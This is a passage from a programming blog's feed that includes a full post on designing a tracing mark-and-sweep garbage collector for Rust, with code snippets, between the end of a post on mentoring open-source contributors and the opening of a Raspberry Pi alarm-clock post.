<p>Joel Maher and the Mozilla Tools team <a href="https://elvis314.wordpress.com/2015/10/02/hacking-on-a-defined-length-contribution-program/">have started a pretty great program called &ldquo;Quarter of Contribution&rdquo;</a> which provides focused mentorship for a particular project. It seems to work out well. Programs like Google Summer of Code and Outreachy also provide ways for new contributors to try out your project at a significant level of involvement.</p>

<p><em>Creating</em> such projects or harder bugs is a nontrivial problem, and I don&rsquo;t have a clear idea on how this can be done (aside from using similar techniques as listed in the &ldquo;creating easy bugs&rdquo; section above). Ideas welcome!</p>

<p>Projects aren&rsquo;t always necessary here either. Depending on the contributor, sometimes you can present them with a regular (i.e., not &ldquo;easy&rdquo; or otherwise earmarked) issue to work on, provide some hints, and tell them to try and figure stuff out without your help (or with less help). Stay involved, and encourage them to ask questions of others or initiate discussions, but try to stick to observing. It&rsquo;s really fun to watch someone figure stuff out on their own. I did this with a contributor <a href="https://github.com/rust-lang/rust/pull/30377">here</a>, where I only provided the initial hint and the code review; as well as <a href="https://github.com/rust-lang/rust/pull/29989">here</a>, where I encouraged the contributor to initiate and direct the relevant bikeshedding on various channels without my involvement. The contributor is now more in touch with the Rust community and codebase as a result; and for me I enjoyed watching him figure stuff out and direct discussions on his own.</p>

<h2>Mentor! Share!</h2>

<p>I&rsquo;m still exploring these techniques myself. I&rsquo;ve had great results applying some of these to <a href="https://github.com/Manishearth/rust-clippy/">clippy</a>, and we already apply many of them to Servo. I&rsquo;m <a href="https://users.rust-lang.org/t/mentoring-newcomers-to-the-rust-ecosystem/3088">slowly working on applying these techniques to Rust</a>.</p>

<p>While some of these projects I&rsquo;m always open to hearing about more ideas for making it easier for newcomers to contribute, so please let me know if you have any ideas or experiences to share!</p>

<p>Mentoring, while a lot of work, is an insanely rewarding experience, and I hope you try to incorporate it into your open source projects!</p>

<p><em>Thanks to Josh Matthews, James Graham, Emily Dunham, and Joel Maher for feedback on drafts of this post</em></p>

<p><small>discuss: <a href="https://news.ycombinator.com/item?id=10836345">HN</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>I&rsquo;ve lost track of the number of times I&rsquo;ve helped someone through <code>git rebase</code> and merge conflicts on Servo<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>This often happens with open source projects with paid staff &ndash; the staff is around during the workday, but the contributors are around during the evenings, so there&rsquo;s less overlap.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>There are various reasons why you should <em>not</em> do this, mainly because non-merge-related changes in merge commits are hard to track down. Be aware of the downsides and use this trick judiciously.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Designing a GC in Rust]]></title>
    <link href="http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust/"/>
    <updated>2015-09-01T01:23:40-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/09/01/designing-a-gc-in-rust</id>
    <content type="html"><![CDATA[<p>For a while I&rsquo;ve been working on a <a href="http://github.com/Manishearth/rust-gc/">garbage collector for Rust</a> with <a href="http://github.com/mystor">Michael
Layzell</a>. I thought this would be a good time to talk of our design and progress so far.</p>

<h1>Motivation</h1>

<p>&ldquo;Wait&rdquo;, you ask, &ldquo;why does Rust need a garbage collector&rdquo;? Rust is supposed to work <em>without</em> a GC,
that&rsquo;s one of its main selling points!</p>

<p>True. Rust <em>does</em> work pretty well without a GC. It&rsquo;s managed to do without one so far, and we still
have all sorts of well-written crates out there (none of which use a GC).</p>

<p>But Rust is not just about low-cost memory safety. It&rsquo;s also <a href="http://manishearth.github.io/blog/2015/05/27/wrapper-types-in-rust-choosing-your-guarantees/">about choosing your costs and
guarantees</a>. <code>Box&lt;T&gt;</code> and stack allocation are not always sufficient, sometimes one needs to
reach for something like <code>Rc&lt;T&gt;</code> (reference counting). But even <code>Rc</code> is not perfect; it can&rsquo;t handle
cycles between pointers. There are solutions to that issue like using <code>Weak&lt;T&gt;</code>, but that only works
in limited cases (when you know what the points-to graph looks like at compile time), and isn&rsquo;t very
ergonomic.</p>

<p>Cases where one needs to maintain a complicated, dynamic graph are where a GC becomes useful.
Similarly, if one is writing an interpreter for a GCd language, having a GC in Rust would simplify
things a lot.</p>

<p>Not to say that one should pervasively use a GC in Rust. Similar to <code>Rc&lt;T&gt;</code>, it&rsquo;s best to use
regular ownership-based memory management as much as possible, and sprinkle <code>Rc</code>/<code>Gc</code> in places
where your code needs it.</p>

<h1>Previous designs</h1>

<p>This isn&rsquo;t the first GC in Rust. Automatic memory management has existed before in various forms,
but all were limited.</p>

<p>Besides the ones listed below, Nick Fitzgerald&rsquo;s <a href="https://github.com/fitzgen/bacon-rajan-cc">cycle collector</a> based on <a href="researcher.watson.ibm.com/researcher/files/us-bacon/Bacon01Concurrent.pdf">this paper</a>
exists and is something that you should look into if you&rsquo;re interested. There&rsquo;s also <a href="https://github.com/pliniker/mo-gc/blob/master/doc/Project-RFC.md">an RFC</a>
by Peter Liniker which sketches out a design for an immutable GC.</p>

<h2>Core Rust GC(s)</h2>

<p>Rust itself had a garbage collector until a bit more than a year ago. These &ldquo;managed pointers&rdquo;
(<code>@T</code>) were part of the language. They were removed later with a plan to make GC a library feature.</p>

<p>I believe these were basically reference counted (cycle collected?) pointers with some language
integration, but I&rsquo;m not sure.</p>

<p>Nowadays, the only form of automatic memory management in Rust are via <a href="http://doc.rust-lang.org/alloc/rc/struct.Rc.html"><code>Rc</code></a> and <a href="http://doc.rust-lang.org/std/sync/struct.Arc.html"><code>Arc</code></a>
which are nonatomic and atomic reference counted pointers respectively. In other words, they keep
track of the number of shared references via a reference count (incremented when it is cloned,
decremented when destructors run). If the reference count reaches zero, the contents are cleaned up.</p>

<p>This is a pretty useful abstraction, however, as mentioned above, it doesn&rsquo;t let you create cycles
without leaking them.</p>

<h2>Spidermonkey</h2>

<p><em>You can read more about Servo&rsquo;s Spidermonkey bindings <a href="https://blog.mozilla.org/research/2014/08/26/javascript-servos-only-garbage-collector/">in this blog post</a> (somewhat
outdated, but still relevant)</em></p>

<p>In Servo we use <a href="http://github.com/servo/rust-mozjs/">bindings to the Spidermonkey Javascript engine</a>. Since Javascript is a
garbage collected language, the Rust representations of Javascript objects are also garbage
collected.</p>

<p>Of course, this sort of GC isn&rsquo;t really useful for generic use since it comes bundled with a JS
runtime. However, the Rust side of the GC is of a design that could be used in an independent
library.</p>

<p>The Rust side of the Spidermonkey GC is done through a bunch of smart pointers, and a trait called
<code>JSTraceable</code>. <code>JSTraceable</code> is a trait which can &ldquo;trace&rdquo; recursively down some data, finding and
marking all GC-managed objects inside it. This is autoderived using Rust&rsquo;s plugin infrastructure, so
a simple <code>#[jstraceable]</code> annotation will generate trace hooks for the struct it is on.</p>

<p>Now, we have various smart pointers. The first is <code>JS&lt;T&gt;</code>. This is opaque, but can be held by other
GC-managed structs. To use this on the stack, this must be explicitly <em>rooted</em>, via <code>.root()</code>. This
produces a <code>Root&lt;T&gt;</code>, which can be dereferenced to get the inner object. When the <code>Root</code> is created,
the contained object is listed in a collection of &ldquo;roots&rdquo; in a global. A root indicates that the
value is being used on the stack somewhere, and the GC starts tracing usage from these roots. When
the <code>Root&lt;T&gt;</code> is destroyed, the root is removed.</p>

<p>The problem with this is that <code>JS&lt;T&gt;</code> doesn&rsquo;t work on the stack. There is no way for the GC to know
that we are holding on to <code>JS&lt;T&gt;</code> on the stack. So, if I copy a <code>JS&lt;T&gt;</code> to the stack, remove all
references to it from objects in the GC heap, and trigger a collection, the <code>JS&lt;T&gt;</code> will still be
around on the stack after collection since the GC can&rsquo;t trace to it. If I attempt to root it, I may
get a panic or a segfault depending on the implementation.</p>

<p>To protect against this, we have a bunch of lints. The <a href="https://github.com/servo/servo/blob/master/components/plugins/lints/unrooted_must_root.rs">relevant one</a> here protects
against <code>JS&lt;T&gt;</code> from being carried around on the stack; but like most lints, it&rsquo;s not perfect.</p>

<p>To summarize: Spidermonkey gives us a good GC. However using it for a generic Rust program is ill
advised. Additionally, Servo&rsquo;s wrappers around the GC are cheap, but need lints for safety. While it
would probably be possible to write safer wrappers for general usage, it&rsquo;s pretty impractical to
carry around a JS runtime when you don&rsquo;t need one.</p>

<p>However, Spidermonkey&rsquo;s GC did inspire me to think more into the matter.</p>

<h1>Brainstorming a design</h1>

<p>For quite a while I&rsquo;d had various ideas about GCs. Most were simplifications of Servo&rsquo;s wrappers
(there&rsquo;s some complexity brought in there by Spidermonkey that&rsquo;s not necessary for a general GC).
Most were tracing/rooting with mark-and-sweep collection. All of them used lints. Being rather busy,
I didn&rsquo;t really work on it past that, but planned to work on it if I could find someone to work
with.</p>

<p>One day, <a href="http://github.com/mystor">Michael</a> pinged me on IRC and asked me about GCs. Lots of people knew that I was
interested in writing a GC for Rust, and one of them directed him to me when he expressed a similar
interest.</p>

<p>So we started discussing GCs. We settled on a tracing mark-and-sweep GC. In other words, the GC runs
regular &ldquo;sweeps&rdquo; where it first &ldquo;traces&rdquo; the usage of all objects and marks them and their children
as used, and then sweeps up all unused objects.</p>

<p>This model on its own has a flaw. It doesn&rsquo;t know about GC pointers held on the stack as local
variables (&ldquo;stack roots&rdquo;). There are multiple methods for solving this. We&rsquo;ve already seen one above
in the Spidermonkey design &ndash; maintain two types of pointers (one for the stack, one for the heap),
and try very hard using static analysis to ensure that they don&rsquo;t cross over.</p>

<p>A common model (used by GCs like Boehm, called &ldquo;conservative GCs&rdquo;) is to do something called &ldquo;stack
scanning&rdquo;. In such a system, the GC goes down the stack looking for things which may perhaps be GC
pointers. Generally the GC allocates objects in known regions of the memory, so a GC pointer is any
value on the stack which belongs to one of these regions.</p>

<p>Of course, this makes garbage collection rather inefficient, and will miss cases like <code>Box&lt;Gc&lt;T&gt;&gt;</code>
where the GCd pointer is accessible, but through a non-GC pointer.</p>

<p>We decided rather early on that we didn&rsquo;t want a GC based on lints or stack scanning. Both are
rather suboptimal solutions in my opinion, and very hard to make sound<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. We were also hoping that
Rust&rsquo;s type system and ownership semantics could help us in designing a good, safe, API.</p>

<p>So, we needed a way to keep track of roots, and we needed a way to trace objects.</p>

<h2>Tracing</h2>

<p>The latter part was easy. We wrote a compiler plugin (well, we stole <a href="https://github.com/servo/servo/blob/master/components/plugins/jstraceable.rs#L38">Servo&rsquo;s tracing plugin which
I&rsquo;d written earlier</a>) which autoderives an implementation of the <code>Trace</code> trait on any
given struct or enum, using the same internal infrastructure that <code>#[derive(PartialEq)]</code> and the
rest use. So, with just the following code, it&rsquo;s easy to make a struct or enum gc-friendly:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[derive(Trace)]</span>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span><span class="o">:</span> <span class="kt">u8</span><span class="p">,</span>
</span><span class='line'>    <span class="n">y</span><span class="o">:</span> <span class="n">Bar</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#[derive(Trace)]</span>
</span><span class='line'><span class="k">enum</span> <span class="n">Bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Baz</span><span class="p">(</span><span class="kt">u8</span><span class="p">),</span> <span class="n">Quux</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>For a <code>foo</code> of type <code>Foo</code> <code>foo.trace()</code>, will expand to a call of <code>foo.x.trace()</code> and
<code>foo.y.trace()</code>. <code>bar.trace()</code> will check which variant it is and call <code>trace()</code> on the <code>u8</code> inside
if it&rsquo;s a <code>Baz</code>. For most structs this turns out to be a no-op and is often optimized away by
inlining, but if a struct contains a <code>Gc&lt;T&gt;</code>, the special implementation of <code>Trace</code> for <code>Gc&lt;T&gt;</code> will
&ldquo;mark&rdquo; the traceability of the <code>Gc&lt;T&gt;</code>. Types without <code>Trace</code> implemented cannot be used in types
implementing <code>Trace</code> or in a <code>Gc</code>, which is enforced with a <code>T: Trace</code> bound on <code>Gc&lt;T&gt;</code>.</p>

<p>So, we have a way of walking the fields of a given object and finding inner <code>Gc&lt;T&gt;</code>s. Splendid. This
lets us write the mark&amp;sweep phase easily: Take the list of known reachable <code>Gc&lt;T&gt;</code>s, walk their
contents until you find more <code>Gc&lt;T&gt;</code>s (marking all you find), and clean up any which aren&rsquo;t
reachable.</p>

<h2>Rooting</h2>

<p>Of course, now we have to solve the problem of keeping track of the known reachable <code>Gc&lt;T&gt;</code>s, i.e.
the roots. This is a hard problem to solve without language support, and I hope that eventually we
might be able to get the language hooks necessary to solve it. LLVM <a href="http://llvm.org/docs/GarbageCollection.html#gcroot">has support for tracking
GCthings on the stack</a>, and some day we may be able to leverage that in Rust.</p>

<p>As noted above, Spidermonkey&rsquo;s solution was to have non-rooted (non-dereferencable) heap pointers,
which can be explicitly converted to rooted pointers and then read.</p>

<p>We went the other way. All <code>Gc&lt;T&gt;</code> pointers, when created, are considered &ldquo;rooted&rdquo;. The instance of
<code>Gc&lt;T&gt;</code> has a &ldquo;rooted&rdquo; bit set to true, and the underlying shared box (<code>GcBox</code>, though this is not a
public interface) has its &ldquo;root count&rdquo; set to one.</p>

<p>When this <code>Gc&lt;T&gt;</code> is cloned, an identical <code>Gc&lt;T&gt;</code> (with rooted bit set to true) is returned, and the
underlying root count is incremented. Cloning a <code>Gc</code> does not perform a deep copy.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">a</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span> <span class="c1">// a.root = true, (*a.ptr).roots = 1, (*a.ptr).data = 20</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// ptr points to the underlying box, which contains the data as well as</span>
</span><span class='line'><span class="c1">// GC metadata like the root count. `Gc::new()` will allocate this box</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">b</span> <span class="o">=</span> <span class="n">a</span><span class="p">.</span><span class="n">clone</span><span class="p">();</span> <span class="c1">// b.root = true, (*a.ptr).roots++, b.ptr = a.ptr</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is rather similar to how <code>Rc</code> works, however there is no <code>root</code> field, and the <code>roots</code> counter
is called a &ldquo;reference counter&rdquo;.</p>

<p>For regular local sharing, it is recommended to just use a borrowed reference to the inner variable
(borrowing works fine with rust-gc!) since there is no cost to creating this reference.</p>

<p>When a GC thing is put inside another GC thing, the first thing no longer can remain a root. This is
handled by &ldquo;unrooting&rdquo; the first GC thing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">bar</span><span class="o">:</span> <span class="kt">u32</span><span class="p">,</span>
</span><span class='line'>    <span class="n">baz</span><span class="o">:</span> <span class="n">Gc</span><span class="o">&lt;</span><span class="kt">u32</span><span class="o">&gt;</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">a</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span> <span class="c1">// why anyone would want to GC an integer I&#39;ll never know</span>
</span><span class='line'>                     <span class="c1">// but I&#39;ll stick with this example since it&#39;s simple</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">b</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Foo</span> <span class="p">{</span><span class="n">bar</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">baz</span><span class="o">:</span> <span class="n">a</span><span class="p">});</span>
</span><span class='line'><span class="c1">// a.root = false, (*a.ptr).roots--</span>
</span><span class='line'><span class="c1">// b initialized similar to previous example</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `a` was moved into `b`, so now `a` cannot be accessed directly here</span>
</span><span class='line'><span class="c1">// other than through `b`, and `a` is no longer a root.</span>
</span><span class='line'><span class="c1">// To avoid moving a, passing `a.clone()` to `b` will work</span>
</span></code></pre></td></tr></table></div></figure>


<p>Of course, we need a way to traverse the object passed to the <code>Gc&lt;T&gt;</code>, in this case <code>Foo</code>, and look
for any contained <code>Gc&lt;T&gt;</code>s to unroot. Sound familiar? This needs the same mechanism that <code>trace()</code>
needed! We add struct-walking <code>root()</code> and <code>unroot()</code> methods to the <code>Trace</code> trait which are auto-
derived exactly the same way, and continue. (We don&rsquo;t need <code>root()</code> right now, but we will need it
later on).</p>

<p>Now, during collection, we can just traverse the list of <code>GcBox</code>s and use the ones with a nonzero
root count as roots for our mark traversal.</p>

<p>So far, so good. We have a pretty sound design for a GC that works &hellip; for immutable data.</p>

<h3>Mutability</h3>

<p>Like <code>Rc&lt;T&gt;</code>, <code>Gc&lt;T&gt;</code> is by default immutable. Rust abhors aliasable mutability, <a href="http://manishearth.github.io/blog/2015/05/17/the-problem-with-shared-mutability/">even in single
threaded contexts</a>, and both these smart pointers allow aliasing.</p>

<p>Mutation poses a problem for our GC, beyond the regular problems of aliasable mutability: It&rsquo;s
possible to move rooted things into heap objects and vice versa:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="nb">None</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="o">*</span><span class="n">y</span> <span class="o">=</span> <span class="nb">Some</span><span class="p">(</span><span class="n">x</span><span class="p">);</span> <span class="c1">// uh oh, x is still considered rooted!</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// and the reverse!</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="nb">Some</span><span class="p">(</span><span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">20</span><span class="p">)));</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">y</span><span class="p">.</span><span class="n">take</span><span class="p">();</span> <span class="c1">// x was never rooted!</span>
</span><span class='line'><span class="c1">// `take()` moves the `Some(Gc&lt;u32&gt;)` out of `y`, replaces it with `None`       </span>
</span></code></pre></td></tr></table></div></figure>


<p>Since <code>Gc&lt;T&gt;</code> doesn&rsquo;t implement <code>DerefMut</code>, none of this is possible &mdash; one cannot mutate the
inner data. This is one of the places where Rust&rsquo;s ownership/mutability system works out awesomely
in our favor.</p>

<p>Of course, an immutable GC isn&rsquo;t very useful. We can&rsquo;t even create cycles in an immutable GC, so why
would anyone need this in the first place<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>?</p>

<p>So of course, we needed to make it somehow mutable. People using <code>Rc&lt;T&gt;</code> solve this problem by using
<code>RefCell&lt;T&gt;</code>, which maintains something similar to the borrow semantics at runtime and is internally
mutable. <code>RefCell&lt;T&gt;</code> itself can&rsquo;t be used by us since it doesn&rsquo;t guard against the problem
illustrated above (and hence won&rsquo;t implement <code>Trace</code>, but a similar cell type would work).</p>

<p>So we created <code>GcCell&lt;T&gt;</code>. This behaves just like <code>RefCell&lt;T&gt;</code>, except that it will <code>root()</code> before
beginning a mutable borrow, and <code>unroot()</code> before ending it (well, only if it itself is not rooted,
which is tracked by an internal field similar to <code>Gc&lt;T&gt;</code>). Now, everything is safe:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[derive(Trace)]</span>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">a</span><span class="o">:</span> <span class="kt">u8</span><span class="p">,</span>
</span><span class='line'>    <span class="n">b</span><span class="o">:</span> <span class="n">GcCell</span><span class="o">&lt;</span><span class="n">Gc</span><span class="o">&lt;</span><span class="kt">u8</span><span class="o">&gt;&gt;</span><span class="p">,</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">Foo</span> <span class="p">{</span><span class="n">a</span><span class="o">:</span> <span class="mi">10</span><span class="p">,</span> <span class="n">b</span><span class="o">:</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">30</span><span class="p">)});</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="o">*</span><span class="n">y</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">borrow_mut</span><span class="p">()</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span> <span class="c1">// the `Gc(30)` from `y.b` was rooted by this call</span>
</span><span class='line'>                           <span class="c1">// but since we don&#39;t actually use it here,</span>
</span><span class='line'>                           <span class="c1">// the destructor gets rid of it.</span>
</span><span class='line'>                           <span class="c1">// We could use swap() to retain access to it.</span>
</span><span class='line'>    <span class="c1">// ...</span>
</span><span class='line'>    <span class="c1">// x unrooted</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="c1">// and the reverse case works too:</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">y</span> <span class="o">=</span> <span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="n">GcCell</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="nb">Some</span><span class="p">(</span><span class="n">Gc</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="mi">20</span><span class="p">))));</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">x</span> <span class="o">=</span> <span class="n">y</span><span class="p">.</span><span class="n">borrow_mut</span><span class="p">().</span><span class="n">take</span><span class="p">();</span> <span class="c1">// the inner `Some(Gc(20))` gets rooted by `borrow_mut()`</span>
</span><span class='line'>                               <span class="c1">// before `x` can access it</span>
</span></code></pre></td></tr></table></div></figure>


<p>So now, mutation works too! We have a working garbage collector!</p>

<h1>Open problems</h1>

<h2>Destructors</h2>

<p>I believe this can be solved without lints, but it <em>may</em> require some upcoming features of Rust to
be implemented first (like specialization).</p>

<p>In essence, destructors implemented on a value inside <code>Gc&lt;T&gt;</code> can be unsafe. This will only happen
if they try to access values within a <code>Gc&lt;T&gt;</code> &mdash; if they do, they may come across a box that
has already been collected, or they may lengthen the lifetime of a box scheduled to be collected.</p>

<p>The basic solution to this is to use &ldquo;finalizers&rdquo; instead of destructors. Finalizers, like in Java,
are not guaranteed to run. However, we may need further drop hooks or trait specialization to make
an airtight interface for this. I don&rsquo;t have a concrete design for this yet, though.</p>

<h2>Concurrency</h2>

<p>Our model mostly just works in a concurrent situation (with thread safety tweaks, of course); in
fact it&rsquo;s possible to make it so that the concurrent GC will not &ldquo;stop the world&rdquo; unless someone
tries to do a write to a <code>GcCell</code>. We have an experimental concurrent GC in <a href="https://github.com/Manishearth/rust-gc/pull/6">this pull
request</a>. We still need to figure out how to make interop between both GCs safe, though we may
just end up making them such that an object using one GC cannot be fed to an object using the other.</p>

<h2>Performance</h2>

<p>So far we haven&rsquo;t really focused on performance, and worked on ensuring safety. Our collection
triggering algorithm, for example, was horribly inefficient, though we planned on improving it. The
wonderful Huon <a href="https://github.com/Manishearth/rust-gc/pull/9">fixed this</a>, though.</p>

<p>Similarly, we haven&rsquo;t yet optimized storage. We have some ideas which we may work on later. (If you
want to help, contributions welcome!)</p>

<h2>Cross-crate deriving</h2>

<p>Currently, an object deriving <code>Trace</code> should have <code>Trace</code>able children. This isn&rsquo;t always possible
when members from another crate (which does not depend on rust-gc) are involved. At the moment, we
allow an <code>#[unsafe_ignore_trace]</code> annotation on fields which are of this type (which excludes it
from being traced &ndash; if that crate doesn&rsquo;t transitively depend on rust-gc, its members cannot
contain GCthings anyway unless generics are involved). It should be possible to detect whether or
not this is safe, and/or autoderive <code>Trace</code> using the opt-in builtin traits framework (needs
specialization to work), but at the moment we don&rsquo;t do anything other than expose that annotation.</p>

<p>Stdlib support for a global <code>Trace</code> trait that everyone derives would be awesome.</p>

<h1>Conclusion</h1>

<p>Designing a GC was a wonderful experience! I didn&rsquo;t get to write much code (I was busy and Michael
was able to implement most of it overnight because he&rsquo;s totally awesome), but the long design
discussions followed by trying to figure out holes in the GC design in every idle moment of the day
were quite enjoyable. GCs are very hard to get right, but it&rsquo;s very satisfying when you come up with
a design that works! I&rsquo;m also quite happy at how well Rust helped in making a safe interface.</p>

<p>I encourage everyone to try it out and/or find holes in our design. Contributions of all kind
welcome, we&rsquo;d especially love performance improvements and testcases.</p>

<p><small>Discuss: <a href="https://news.ycombinator.com/item?id=10148471">HN</a>, <a href="https://www.reddit.com/r/rust/comments/3j4bx2/designing_a_gc_in_rust/">Reddit</a></small></p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>I&rsquo;m very skeptical that it&rsquo;s possible to make either of these completely sound without writing lints which effectively rewrite a large chunk of the compiler<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>There is a case to be made for an immutable GC which allows some form of deferred initialization of GC fields, however.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The World's Most Over-engineered Alarm Clock]]></title>
    <link href="http://manishearth.github.io/blog/2015/08/29/the-worlds-most-over-engineered-alarm-clock/"/>
    <updated>2015-08-29T01:08:59-07:00</updated>
    <id>http://manishearth.github.io/blog/2015/08/29/the-worlds-most-over-engineered-alarm-clock</id>
    <content type="html"><![CDATA[<p>A few weeks ago, I set up my Raspberry Pi as a music server so that I could listen to music without
having to deal with keeping my laptop in a certain corner of the room.</p>

<p>After setting it all up, it occurred to me: &ldquo;I can do much more with this!&rdquo;.</p>

<p>Waking up to go to class in the morning is always a challenge for me. It&rsquo;s not that I don&rsquo;t wake up
&mdash; I often wake up, cancel all the alarms, and go back to bed. Half-asleep me somehow has the
skill to turn off alarms, but not the discipline of going to class<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. I&rsquo;ve tried those apps that
make you do math before you can cancel the alarm, and I&rsquo;m able to do the math and go back to sleep
without fully waking up in the process (Hey, I&rsquo;m a physics student; math is what we do!).</p>

<p>So I decided to create an alarm clock. Not just any alarm clock, the most overengineered alarm clock
I can think of.</p>

<p>It consists of the Pi connected to a speaker and kept in a hard-to-reach area of the room. The Pi is
on a DHCP network. Every night, I ssh to the Pi, set the volume to full, and run a script which,
using <code>at</code> and <code>mpg123</code>, will schedule jobs to run around the desired time of waking up. First,
